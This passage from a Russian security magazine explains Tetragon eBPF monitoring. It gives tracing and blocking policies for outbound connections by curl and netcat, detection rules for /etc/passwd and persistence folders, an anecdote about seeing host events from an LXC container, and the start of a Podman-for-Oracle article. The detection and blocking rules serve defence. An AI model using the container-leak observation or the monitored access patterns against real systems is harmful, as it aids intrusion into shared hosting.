Здесь
 • "in_init_tree":true — запуск произошел изнутри контейнера;
 • "docker":"d7a..." — идентификатор контейнера.

Если внимательней посмотреть на вывод, можно заметить, что при выпол‐
нении команды whoami на уровне системы происходит чтение файла /etc/
passwd (при наличии политики трассировки с функцией "function_name":
"security_file_permission"), с таким выводом данных можно начать луч‐
ше понимать принципы работы ОС.


Просмотр событий в реальном времени
Есть небольшие полезности, которые экономят время. Чем лезть в сиемку
и тейлить файлы с логами, куда легче набрать простую команду. Посмотреть
активность в реальном времени и в компактном формате на хосте xakep мож‐
но так:


tetra getevents -o compact

Увидим следующий вывод (здесь ракета — старт, а взрыв — завершение про‐
цессов).



 🚀 process xakep /usr/sbin/sshd -D -R
 💥 exit    xakep /usr/bin/sleep 0.125 0
 🚀 process xakep /usr/bin/cat
  /sys/class/net/veth1752502i0/statistics/rx_packets
 💥 exit    xakep /usr/bin/cat
  /sys/class/net/veth1752502i0/statistics/rx_packets 0
 🚀 process xakep /usr/bin/expr 28554688 - 28554688
 💥 exit    xakep /usr/bin/expr 28554688 - 28554688 1
 🚀 process xakep /usr/sbin/iptables -L -vn





                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
АУДИТ ПО-ВЗРОСЛОМУ
              ПРИМЕНЯЕМ TETRAGON
           НА ПРАКТИКЕ (И УБЕЖДАЕМСЯ
                      В СИЛЕ EBPF)





ПОЛИТИКИ ТРАССИРОВКИ

Дальше мы посмотрим, как политики трассировки могут выступить в роли
инструмента точечного логирования, и покажем, как использовать действие
в качестве гибко настраиваемой превентивной меры.
   Папка политик трассировки — /etc/tetragon/tetragon.tp.d/. Сами
политики мы подробно рассмотрим далее.


           WARNING

                          После добавления или изменения политик необ‐
                      ходимо    перезапускать    службу    командой
                   systemctl restart tetragon!


Если служба не стартует (или не в состоянии active больше десяти секунд), то
с вероятностью, близкой к 100%, косяк — в синтаксисе политики (очень часто
YAML портят пустые или служебные символы в конце файла).
   Чтобы прочитать журнал и убедиться, что все работает как надо, выпол‐
няем следующие команды:


journalctl -xeu tetragon.service


# Или так — иногда помогает
systemctl status tetragon

Если накосячил в одной из политик, увидишь ошибку.



  Failed to start tetragon error="policy handler 'tracing' failed loading
  policy 'tcp-only-external-addrs': validation failed"


Без дополнительно созданных политик в Tetragon логируются события соз‐
дания (process_exec) и завершения процесса (process_exit). Глянем логи
этих событий.
   Пример завершения чтения файла /etc/passwd командой cat:


{
  "process_exit": {
    "process": {
      "exec_id": "eGFrZXA6MTM4MjkyMzk2NTkyNjM2Mjc6Mjk2NDM5",
      "pid": 296439,
      "uid": 0,
      "cwd": "/root/tetragon/tetragon-v1.2.0-amd64",
      "binary": "/usr/bin/cat",
      "arguments": "/etc/passwd",
      "flags": "execve clone",
      "start_time": "2024-11-05T11:52:47.775421543Z",
      "auid": 0,
      "parent_exec_id": "eGFrZXA6MTM4MTIyMDg0MjAwMDAwMDA6MjcwMTI=",
      "tid": 296439,
      "user": {
        "name": "root"
      }
    },
    "parent": {
      "exec_id": "eGFrZXA6MTM4MTIyMDg0MjAwMDAwMDA6MjcwMTI=",
      "pid": 27012,
      "uid": 0,
      "binary": "/usr/bin/bash",
      "arguments": " " /root/tetragon/tetragon-v1.2.0-amd64"",
      "flags": "procFS auidnocwd",
      "start_time": "2024-11-05T07:08:56.536154067Z",
      "auid": 0,
      "parent_exec_id": "eGFrZXA6MTM4MTIyMDg0MjAwMDAwMDA6MjcwMTI=",
      "tid": 27012,
      "user": {
        "name": "root"
      }
    },
    "time": "2024-11-05T11:52:47.778558683Z"
  },
  "node_name": "xakep",
  "time": "2024-11-05T11:52:47.778555561Z"
}

Несмотря на определенную избыточность, сразу видно, что юзер root в обо‐
лочке bash открывал целевой файл. Приятно, что есть инфа о родительском
процессе, — это упрощает расследование инцидентов.
  В документации описаны и другие политики с указанием релевантных сце‐
нариев безопасности. Например, благодаря мониторингу создания и завер‐
шения  процессов можно отслеживать выполнение исполняемых файлов
в каталоге /tmp, выполнение команд через sudo, использование бита SUID.
Настоятельно рекомендуем ознакомиться с этим разделом справки!


Блокировка в политике
Простым мониторингом дело не ограничивается. Можно блокировать что‑то
согласно политике (пример — в репозитории Tetragon). Особое внимание
обрати на часть после селектора, в конце:


matchActions:
- action: Sigkill





            Пример блокировки по внешнему взаимодействию

На скриншоте выше видно, что были убиты процессы netcat и curl из‑за
домена ya.ru и порта 443 (HTTPS).
   Вот что в логах:


{"process_exec":{"process":{"exec_id":
"eGFrZXA6MjUzMTMwMDY4NTc3NTUzNTY6MzIzOTE0MA==", "pid":3239140, "uid":
0, "cwd":"/root", "binary":"/usr/bin/curl", "arguments":"https://ya.
ru", "flags":"execve clone", "start_time":"2025-03-18T09:51:54.
520338864Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "tid":3239140, "user"
:{"name":"root"}, "in_init_tree":false}, "parent":{"exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "pid":3195687, "uid":
0, "binary":"/usr/bin/bash", "arguments":" " /root"", "flags":
"procFS auid nocwd", "start_time":"2025-03-06T11:34:35.302582913Z",
"auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "tid":3195687, "user"
:{"name":"root"}, "in_init_tree":false}}, "node_name":"xakep", "time"
:"2025-03-18T09:51:54.520338132Z"}


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjUzMTMwMDY4NTc3NTUzNTY6MzIzOTE0MA==", "pid":3239140, "uid":
0, "cwd":"/root", "binary":"/usr/bin/curl", "arguments":"https://ya.
ru", "flags":"execve clone", "start_time":"2025-03-18T09:51:54.
520338864Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "refcnt":1, "tid":
3239140, "user":{"name":"root"}, "in_init_tree":false}, "parent":{
"exec_id":"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "pid":
3195687, "uid":0, "binary":"/usr/bin/bash", "arguments":" " /root"",
"flags":"procFS auid nocwd", "start_time":"2025-03-06T11:34:35.
302582913Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "tid":3195687, "user"
:{"name":"root"}, "in_init_tree":false}, "function_name":
"tcp_connect", "args":[{"sock_arg":{"family":"AF_INET", "type":"1536"
, "protocol":"IPPROTO_TCP", "saddr":"10.68.85.126", "daddr":"5.255.
255.242", "sport":41422, "dport":443, "cookie":"18446615535296672256"
, "state":"TCP_SYN_SENT"}}], "action":"KPROBE_ACTION_POST",
"policy_name":"tcp-only-external-addrs", "return_action":
"KPROBE_ACTION_POST"}, "node_name":"xakep", "time":"2025-03-18T09:51:
54.540689266Z"}


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjUzMTMwMDY4NTc3NTUzNTY6MzIzOTE0MA==", "pid":3239140, "uid":
0, "cwd":"/root", "binary":"/usr/bin/curl", "arguments":"https://ya.
ru", "flags":"execve clone", "start_time":"2025-03-18T09:51:54.
520338864Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "refcnt":1, "tid":
3239140, "user":{"name":"root"}, "in_init_tree":false}, "parent":{
"exec_id":"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "pid":
3195687, "uid":0, "binary":"/usr/bin/bash", "arguments":" " /root"",
"flags":"procFS auid nocwd", "start_time":"2025-03-06T11:34:35.
302582913Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "tid":3195687, "user"
:{"name":"root"}, "in_init_tree":false}, "function_name":
"tcp_sendmsg", "args":[{"sock_arg":{"family":"AF_INET", "type":"1536"
, "protocol":"IPPROTO_TCP", "saddr":"10.68.85.126", "daddr":"5.255.
255.242", "sport":41422, "dport":443, "cookie":"18446615535296672256"
, "state":"TCP_ESTABLISHED"}}, {"int_arg":517}], "action":
"KPROBE_ACTION_SIGKILL", "policy_name":"tcp-only-external-addrs",
"return_action":"KPROBE_ACTION_POST"}, "node_name":"xakep", "time":
"2025-03-18T09:51:54.580731247Z"}


{"process_exit":{"process":{"exec_id":
"eGFrZXA6MjUzMTMwMDY4NTc3NTUzNTY6MzIzOTE0MA==", "pid":3239140, "uid":
0, "cwd":"/root", "binary":"/usr/bin/curl", "arguments":"https://ya.
ru", "flags":"execve clone", "start_time":"2025-03-18T09:51:54.
520338864Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "tid":3239140, "user"
:{"name":"root"}, "in_init_tree":false}, "parent":{"exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "pid":3195687, "uid":
0, "binary":"/usr/bin/bash", "arguments":" " /root"", "flags":
"procFS auid nocwd", "start_time":"2025-03-06T11:34:35.302582913Z",
"auid":0, "parent_exec_id":
"eGFrZXA6MjQyODIzNjc2NDAwMDAwMDA6MzE5NTY4Nw==", "tid":3195687, "user"
:{"name":"root"}, "in_init_tree":false}, "signal":"SIGKILL", "time":
"2025-03-18T09:51:54.581941252Z"}, "node_name":"xakep", "time":
"2025-03-18T09:51:54.581940387Z"}

Обрати внимание на поле "action":"KPROBE_ACTION_SIGKILL" и последу‐
ющее завершение  процесса в "process_exit"..."signal":"SIGKILL".
По  наименованию  "policy_name":"tcp-only-external-addrs"  можно
понять, какая политика сработала.


Написание исключений
Иногда отдельные скрипты или  процессы, например kumarez.sh, могут
генерировать повторяющиеся логи. В таких случаях в Tetragon можно настро‐
ить правило исключения, чтобы избежать избыточного логирования.
  В  папке  /etc/tetragon/tetragon.conf.d/  создаем файл  export-
denylist со следующим содержимым:


{
  "event_set": [
    "PROCESS_EXEC",
    "PROCESS_EXIT"
  ],
  "binary_regex": [
    "^/bin/bash$",
    "^/usr/bin/bash$"
  ],
  "arguments_regex": [
    "/usr/share/user/scripts/kumarez.sh"
  ]
}

После правок не забудь перезапустить службу Tetragon. Подобным образом
можно  исключить  родительские  процессы  (используя  parent_binary
или parent_arguments). Это помогает уменьшить шум в журналах.
  Еще один полезный сниппет для политик — выявление неудачной попыт‐
ки обращения к объекту (то есть когда код возврата отличается от 0):


- matchReturnArgs:
  - index: 0
    operator: "NotEqual"
    values:
    - 0


Сетевая политика трассировки
Мы предпочитаем разбираться с полезными функциями сразу на практике,
поэтому разберем структуру простого правила и его работу.
   Давай посмотрим, как можно написать правило для выявления DNS-зап‐
росов. Вот все, что нам известно про DNS: будет происходить сетевое вза‐
имодействие через 53-й порт по протоколу UDP; соединение — исходящее.
Отлично! Для начала нам надо найти, какая функция, сискол или kprobe в Linux
отвечает за сетевые соединения.
   Общий принцип: лучше всего найти именно конечную функцию, выпол‐
няющую действие, которое мы хотим замониторить. Погрепав по сисколам
(причем мы просто поискали это слово в исходниках Tetragon), упоминания
UDP с ходу не нашли. Окей, обратимся к трейспойнтам:


cat /sys/kernel/debug/tracing/available_events | grep udp

Но вывод тоже жидковат — какие‑то sunrpc. Что ж, остаются пробы:


cat /proc/kallsyms | grep udp | grep send

Вывод небольшой, видим в нем функцию udp_sendmsg — она‑то нам и нужна.
   Следующее, с чем надо определиться, — это аргументы функции, которые
мы хотим мониторить. Можно грепать репозитории Linux, можно искать
в Google. Видим, что первым аргументом идет sock — то есть IP-адрес и порт
назначения.
  Мы знаем, что порт у нас 53-й, поэтому все необходимое для составления
политики у нас есть. Не забываем, что в имени политики недопустимы нижние
подчеркивания, и соблюдаем синтаксис YAML:


apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "dns-udp-tracking"
spec:
  kprobes:
  - call: "udp_sendmsg"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "DPort"
        values:
        - "53"

Сохраняем политику вот по такому пути:


/etc/tetragon/tetragon.tp.d/dns_udp.yaml

Перезапускаем службу:


systemctl restart tetragon

И открываем просмотр событий:


tetra getevents

В соседнем терминале делаем DNS-запрос:


nslookup ya.ru

И видим, как сработала наша политика:


{"process_kprobe":{"process":{"exec_id":
"UEFETUlOOjQ1NjAwMDAwMDA6MQ==", "pid":1, "uid":0, "cwd":"/", "binary"
:"/usr/lib/systemd/systemd", "flags":"procFS auid rootcwd",
"start_time":"2025-03-18T14:10:14.439326884Z", "auid":4294967295,
"parent_exec_id":"UEFETUlOOjE6MA==", "refcnt":36, "tid":598,
"in_init_tree":false}, "parent":{"exec_id":"UEFETUlOOjE6MA==", "pid":
0, "uid":0, "binary":"<kernel>", "flags":"procFS", "start_time":
"2025-03-18T14:10:09.879327579Z", "auid":4294967295, "parent_exec_id"
:"UEFETUlOOjE6MA==", "tid":0, "in_init_tree":false}, "function_name":
"udp_sendmsg", "args":[{"sock_arg":{"family":"AF_INET", "type":
"SOCK_DGRAM", "protocol":"IPPROTO_UDP", "saddr":"192.168.135.3",
"daddr":"8.8.8.8", "sport":34383, "dport":53, "cookie":
"18446637872524733696", "state":"TCP_ESTABLISHED"}}], "action":
"KPROBE_ACTION_POST", "policy_name":"dns-udp-tracking",
"return_action":"KPROBE_ACTION_POST"}, "node_name":"PADMIN", "time":
"2025-03-18T17:06:42.116633601Z"}

Из минусов — поскольку это уровень ядра (ниже некуда), то резолва IP-адре‐
сов тут не будет. Из плюсов — ты дополнительно видишь, с какими полями
события можно работать, например добавить в политику селектор по daddr,
чтобы выбирать обращения не к твоему любимому DNS-серверу (просто
добавь в конец политики).


- index: 0
  operator: "NotDAddr"
  values:
  - "8.8.8.8"

Если тебе нужно также учесть вариант с TCP, то добавь аналогичное правило,
только укажи call: "tcp_connect".
   Бывает, что тебе сразу известен syscall. В Tetragon можно без труда найти
описание  аргументов разных сисколов с  указанием их типа, например
для socket:


"socket": [
{
 "Name": "family",
 "Type": "int"
},
{
 "Name": "type",
 "Type": "int"
},
{
 "Name": "protocol",
 "Type": "int"
}
]

Однако видим, что открытие сокета не дает нам информации, например,
о порте соединения, то есть для использования в чистом виде он не пойдет.
  За основу взяты трассировки из примеров tracingpolicy и quickstart.
   Можно немного усложнить правило и описать трассировку TCP- и UDP-
соединений, при которых происходит обращение на внешние IP-адреса.
Готовое правило смотри на нашем GitHub. В правиле используются сис‐
темные вызовы tcp_connect, tcp_close, tcp_sendmsg и udp_sendmsg.
   Вот  пример  записи  из  журнала  после  выполнения  команды  curl
https://ya.ru:


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjQxOTA0NjIyMTQ0MDg3NjA6MzE5MTQyNA==", "pid":3191424, "uid":
0, "cwd":"/root", "binary":"/usr/bin/curl", "arguments":"https://ya.
ru", "flags":"execve clone", "start_time":"2025-03-05T10:02:49.
876992195Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQxODk4MDc0ODAwMDAwMDA6MzE5MDcyOA==", "refcnt":1, "tid":
3191424, "user":{"name":"root"}, "in_init_tree":false}, "parent":{
"exec_id":"eGFrZXA6MjQxODk4MDc0ODAwMDAwMDA6MzE5MDcyOA==", "pid":
3190728, "uid":0, "binary":"/usr/bin/bash", "arguments":" " /root"",
"flags":"procFS auid nocwd", "start_time":"2025-03-05T09:51:55.
142582919Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQxODk4MDc0MzAwMDAwMDA6MzE5MDcyNw==", "tid":3190728, "user"
:{"name":"root"}, "in_init_tree":false}, "function_name":
"tcp_connect", "args":[{"sock_arg":{"family":"AF_INET", "type":"1536"
, "protocol":"IPPROTO_TCP", "saddr":"10.68.85.126", "daddr":"5.255.
255.242", "sport":33396, "dport":443, "cookie":"18446615511771815040"
, "state":"TCP_SYN_SENT"}}], "action":"KPROBE_ACTION_POST",
"policy_name":"net-only-external-addrs", "return_action":
"KPROBE_ACTION_POST"}, "node_name":"xakep", "time":"2025-03-05T10:02:
49.889349017Z"}

Пример блокировки обращения по UDP на DNS-сервер Google с помощью
netcat:


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjUzOTk5NzE5MTc1NjI1NDQ6MzI0MzY5Mw==", "pid":3243693, "uid":
0, "cwd":"/root", "binary":"/usr/bin/nc", "arguments":"-zvw3 -u 8.8.
8.8 53", "flags":"execve clone", "start_time":"2025-03-19T10:01:19.
580149215Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjUzOTk5NzE5MTc1NjI1NDQ6MzI0MzY5Mw==", "refcnt":1, "tid":
3243693, "user":{"name":"root"}, "in_init_tree":false}, "parent":{
"exec_id":"eGFrZXA6MjUzOTk5NzE5MTc1NjI1NDQ6MzI0MzY5Mw==", "pid":
3195474, "uid":0, "binary":"/usr/bin/bash", "arguments":" " /root"",
"flags":"procFS auid nocwd", "start_time":"2025-03-06T10:16:07.
862583157Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQyNzc2NjAxNDAwMDAwMDA6MzE5NTQ3Mg==", "tid":3195474, "user"
:{"name":"root"}, "in_init_tree":false}, "function_name":
"udp_sendmsg", "args":[{"sock_arg":{"family":"AF_INET", "type":"4352"
, "protocol":"IPPROTO_UDP", "saddr":"10.68.85.126", "daddr":"8.8.8.8"
, "sport":55088, "dport":53, "cookie":"18446615534975814144", "state"
:"TCP_ESTABLISHED"}}, {"int_arg":1}], "action":
"KPROBE_ACTION_SIGKILL", "policy_name":"net-only-external-addrs",
"return_action":"KPROBE_ACTION_POST"}, "node_name":"xakep", "time":
"2025-03-19T10:01:19.598368812Z"}


Файловая политика трассировки
Дальше разберем два других правила, которые выявляют доступ к критически
важным файлам в Linux, любое чтение или изменение в которых может пред‐
ставлять интерес с точки зрения информационной безопасности. Оба пра‐
вила используют вызов ядра security_file_permission.
   Первое правило — на основе оператора Postfix, то есть окончания пути
(некий аналог endswith из Python и JS). Например, у каждого пользователя
в Linux может быть свой файл .bashrc (/root/.bashrc или /home/user2/.
bashrc), куда  злодей может, например,  попытаться  вписать свой  alias
для команды.
   Второе правило основано на операторе Equal и содержит полные пути
до критических файлов в Linux.
   Вот пример записи в журнале об изменении файла /etc/passwd редак‐
тором Vi:


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "pid":3179416, "uid":
0, "cwd":"/root/test", "binary":"/usr/bin/vi", "arguments":"/etc/
passwd", "flags":"execve clone", "start_time":"2025-03-03T12:22:40.
360929717Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "refcnt":1, "tid":
3179416, "user":{"name":"root"}, "in_init_tree":false}, "parent":{
"exec_id":"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "pid":
3163368, "uid":0, "binary":"/usr/bin/bash", "arguments":" " /root/
test"", "flags":"procFS auid nocwd", "start_time":"2025-02-28T07:30:
40.952582904Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjM3NDkzMzMyMzAwMDAwMDA6MzE2MzM2Ng==", "tid":3163368, "user"
:{"name":"root"}, "in_init_tree":false}, function_name":"
security_file_permission", "args":[{"file_arg":{"path":"/etc/passwd
", "permission":"-rw-r--r--"}}, {"int_arg":2}], "return":{"int_arg":
0}, "action":"KPROBE_ACTION_POST", "policy_name":"
file-monitoring-filtered", "return_action":"KPROBE_ACTION_POST"}, "
node_name":"xakep", "time":"2025-03-03T12:22:49.454084205Z"}

Достойно уважения, что в событии приводятся разрешения, установленные
целевому файлу.


{"process_exit":{"process":{"exec_id":
"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "pid":3179416, "uid":
0, "cwd":"/root/test", "binary":"/usr/bin/vi", "arguments":"/etc/
passwd", "flags":"execve clone", "start_time":"2025-03-03T12:22:40.
360929717Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "tid":3179416, "user"
:{"name":"root"}, "in_init_tree":false}, "parent":{"exec_id":
"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "pid":3163368, "uid":
0, "binary":"/usr/bin/bash", "arguments":" " /root/test"", "flags":
"procFS auid nocwd", "start_time":"2025-02-28T07:30:40.952582904Z",
"auid":0, "parent_exec_id":
"eGFrZXA6MjM3NDkzMzMyMzAwMDAwMDA6MzE2MzM2Ng==", "tid":3163368, "user"
:{"name":"root"}, "in_init_tree":false}, "time":"2025-03-03T12:22:49.
455738131Z"}, "node_name":"xakep", "time":"2025-03-03T12:22:49.
455737021Z"}

Если при редактировании файла не сохранить изменение, будет отсутство‐
вать вызов security_file_permission и залогируется просто исполнение
команды в process_exec.
  Для  закрепления — еще  пример  правила: оно  будет  срабатывать
при изменении конфигов критических служб, при создании файлов (сис‐
темный вызов fd_install) в папках с задачами, запускаемыми по расписанию,
и в других сценариях, которые хакеры используют для закрепления.
   Пример лога, который можно наблюдать при создании файла some3.txt
командой touch в папке /etc/profile.d/, куда потенциально может быть
внедрен скрипт автозапуска:


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjQwMjM1OTkyNDY1MjgzOTQ6MzE3Nzc0OA==", "pid":3177748, "uid":
0, "cwd":"/root/test", "binary":"/usr/bin/touch", "arguments":"/etc/
profile.d/some3.txt", "flags":"execve clone", "start_time":
"2025-03-03T11:41:46.909112495Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "refcnt":1, "tid":
3177748, "user":{"name":"root"}, "in_init_tree":false}, "parent":{
"exec_id":"eGFrZXA6MjQwMjYwNTI2OTgzNDM0ODc6MzE3OTQxNg==", "pid":
3163368, "uid":0, "binary":"/usr/bin/bash", "arguments":" " /root/
test"", "flags":"procFS auid nocwd", "start_time":"2025-02-28T07:30:
40.952584497Z", "auid":0, "parent_exec_id":
"eGFrZXA6MjM3NDkzMzMyMzAwMDAwMDA6MzE2MzM2Ng==", "tid":3163368, "user"
:{"name":"root"}, "in_init_tree":false}, "function_name":"fd_install"
, "args":[{"int_arg":3}, {"file_arg":{"path":"/etc/profile.d/some3.
txt", "permission":"-rw-r--r--"}}], "action":"KPROBE_ACTION_POST",
"policy_name":"file-create-open-dirs", "return_action":
"KPROBE_ACTION_POST"}, "node_name":"xakep", "time":"2025-03-03T11:41:
46.912969231Z"}




                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
АУДИТ ПО-ВЗРОСЛОМУ
              ПРИМЕНЯЕМ TETRAGON
           НА ПРАКТИКЕ (И УБЕЖДАЕМСЯ
                      В СИЛЕ EBPF)





КУЛСТОРИ НА ХОСТИНГЕ

Напоследок расскажем про прикол с eBPF на одном из зарубежных хос‐
тингов.
   Как‑то раз мы арендовали виртуалку, а именно LXC-контейнер в славной
Германии.  Запуск  auditd  на  этой машине был  запрещен  политиками
AppArmor. Ниже — переписка с технической поддержкой хостинга.





                          Описываем проблему





                              Полученный ответ

Из‑за «секурити ризон» не хотят сделать исключение для благородных
донов... Что ж, мы ИБшники, нам надо мониторить свою машинку. И тут мы,
конечно, вспомнили про eBPF! Поставили Tetragon, направили журналы
в SIEM, в нашем  случае это была KUMA (Kaspersky  Unified  Monitoring
and Analysis Platform), и заметили, что видим события не только с нашей
машины. Например, продление сертификата Let’s Encrypt какого‑то сайта...





Запуски проверок виртуальных машин на хостовой ОС.





Сетевые соединения по разным LXC-контейнерам...





На последнем скриншоте видно, что фиксируются соединения от источников,
входящих в черные списки, — в нашем случае это blocklist.de (забавно,
что немецкий хостер не блокирует трафик, помеченный немецкими же чер‐
ными списками). Репутация IP-адресов определяется с помощью обогаще‐
ния данных через опенсорсную платформу индикаторов угроз MISP.
  В чем прикол? Если виртуальная машина — LXC-контейнер, то все ядро
общее с хостовой машиной и мы видим, что происходит на хостовой ОС!





                 Отличие LXC-контейнеров от VM и Docker


ВЫВОДЫ

Основной прикол отслеживания системных вызовов в том, что ты можешь
читать файл разными утилитами, но системный вызов один. Это как в матрице
ATT&CK: если знаешь ТТР, то тебе уже не так важны хеши, IP и другие инди‐
каторы.
   Tetragon отлично подойдет для низкоуровневого отслеживания активности
в Linux. Но, несмотря на простоту установки, у этого инструмента высокий
порог вхождения — все‑таки матчасть Linux знать нужно. Мы верим, что
за  eBPF-инструментами в  продуктах безопасности — будущее,  однако
победит наиболее дружелюбный и гибкий инструмент, который позволит
реализовать все влажные фантазии SOC. Относить ли к ним Tetragon —
это вопрос индивидуальный.
   Пока что решения на основе eBPF — это обычно части более комплексных
решений. Однако с развитием технологии обязательно появятся инструменты
для дружелюбного создания политик трассировки. Появятся и эксперты,
готовые делиться опытом по части ядра Linux и безопасности, сформируются
профильные комьюнити.
   Собственно, эта статья и есть первый призыв совершенствовать монито‐
ринг безопасности с применением основанных на eBPF инструментов. На на‐
шем GitHub мы разместили набор правил, в который вошли как коробочные
примеры, так и конфиги из этой статьи.
   Призываем присоединяться и исследовать увлекательный мир eBPF вмес‐
те с нами — добавлять новые критические файлы для мониторинга, политики
трассировки, исключения, реализовывать интересные сценарии мониторинга
или просто готовить сниппеты. Там же мы разместили коллекцию интересных
ссылок на различные материалы по Tetragon и ePBF. Присоединяйся!


        WWW

                          Другие интересные проекты по eBPF, правила
                      и прочие ссылки:
                      •Гайд по eBPF (PDF)
                         •Лаба по Tetragon (нужна учетка на GitHub)
                         •Falco
                          •Pulsar
                        •Tracee
                        •Kunai
АДМИН





В последнее время использование прог‐
рамм   Oracle   в   России   значительно
усложнилось — в  частности, они недос‐
тупны для скачивания напрямую с сайта
разработчика.  Но  все  эти  программы            samhnn                                                                                      Хрисанов Николай
существуют в виде образов контейнеров             Николаевич                                                                                          samhnn@mail.ru
на общедоступных ресурсах, в том числе
на hub.docker.com. В этой статье я покажу,
как их оттуда устанавливать.


Для примера мы запустим программу Analytic Workspace Manager (AWM),
которая предназначена для выполнения операций над хранилищами в виде
многомерных кубов. При этом дополнительно понадобится установить СУБД
Oracle с клиентом SQL Developer.
  В качестве движка контейнеров я решил использовать Podman, пред‐
полагая, что на нем легче будет организовать работу нескольких групп поль‐
зователей на одном компьютере благодаря механизму подов. После прак‐
тического тестирования многочисленных образов с hub.docker.com я раз‐
работал структуру проекта, которой и хочу с тобой поделиться. На хосте у нас
будет работать Alt Linux.





                              Структура проекта


ЧТО ВНУТРИ У ПРОЕКТА

Проект может состоять из нескольких подов с номерами от 1 до 9. Общение
с внешним миром происходит через порт с номером 5152N, где N — номер
пода. Каждый под состоит из четырех контейнеров. Контейнер infra соз‐
дается автоматически при создании пода. Он включает том, находящийся
в папке /colap/globaldb (для демонстрационной базы данных global),
и том в  папке /colap/awm/awm (для программы AWM). Папка /colap/
globaldb также используется для доступа из контейнеров к дополнительным
материалам.
   Контейнер oracledb1 содержит собственно саму СУБД Oracle. К имени
контейнера добавляется номер пода, чтобы исключить конфликт при соз‐
дании такого же контейнера в другом поде. Исходный образ — gvenzl/
oracle-xe:full, на его основе создается собственный образ oracledb1.
  На рисунке красным шрифтом обозначены исходные образы, скачива‐
емые с hub.docker.com. Том, который лежит в папке /colap/podN/oradata,
где N — номер пода, предназначен для хранения баз данных пользователей.
  В контейнере sqldev1 находится клиент SQL Developer. Он создается
непосредственно из образа marcelhuberfoo/sqldeveloper:latest.
   Контейнер awm1  предназначен для  установки программы awm12.jar.
В результате длительных поисков я нашел образ harisekhon/centos-java:
8, содержащий нужную версию Java и набор библиотек, позволяющих запус‐
кать без ошибок программу awm12.jar. Образ oracle-awm:121 создается
из исходного включением в него программы awm12.jar.


СОЗДАЕМ ПРОЕКТ

Каталоги и файлы проекта размещаются в корневом каталоге.





                         Структура каталогов проекта

Папки, отмеченные красным цветом, создаются автоматически с помощью
скрипта, о чем расскажу чуть позже. Создать остальные папки и наполнить их
указанным содержимым нужно вручную.


        WWW

                           Архив папки colap со всем содержимым



Там же находятся исходные архивы awm121020A_Standalone.zip и global-
11g-schema-1-128202.zip с программой AWM и дампом демонстрационной
базы данных global.


СТАВИМ PODMAN И ЗАГРУЖАЕМ ОБРАЗЫ

В Alt Linux для инсталляции Podman нужно с правами root выполнить сле‐
дующую команду:


apt-get install podman

Для загрузки исходных образов выполни такие команды:


podman pull gvenzl/oracle-xe:full
podman pull marcelhuberfoo/sqldeveloper:latest
podman pull harisekhon/centos-java:8

После загрузки образов на хосте необходимо создать группы пользователей,
которые установлены в образах gvenzl/oracle-xe:full и marcelhuberfoo/
sqldeveloper:latest:


groupadd -g 54321 oinstall
useradd --system --uid 54321 --gid oinstall oracle
usermod -a -G oinstall root


groupadd -g 654321 docky
useradd --system --uid 654321 --gid docky docky
usermod -a -G docky root


СОЗДАЕМ ПОДЫ

В папке /colap создай файл podolap-create.sh со следующим содер‐
жимым:


#!/bin/bash
if [ $# -gt 0 ]
 then
  echo "Create podolap"$1
  poddir=/colap/pod$1
  if [ ! -d "$poddir" ]; then
   cd /colap
   mkdir pod$1
   cd  pod$1
   mkdir oradata
   chmod u= rwx,g= rwx,o=rwx  oradata
   cd ..
   chmod u= rwx,g= rwx,o=rwx  pod$1
  fi
  podman pod create --name podolap$1 \
  -p 5152$1:1521 \
  --volume /colap/globaldb:/globaldb:z \
  --volume /colap/awm/awm:/awm:z
 else
  echo "При запуске скрипта указать через пробел номер пода!"
fi

Скрипт для создания пода, например с номером 1, запускается с помощью
такой команды:


/bin/sh   /colap/podolap-create.sh 1
Create podolap1
5bb059913017b024...

Скрипт создаст нужные папки, под podolap1 и контейнер infra с парамет‐
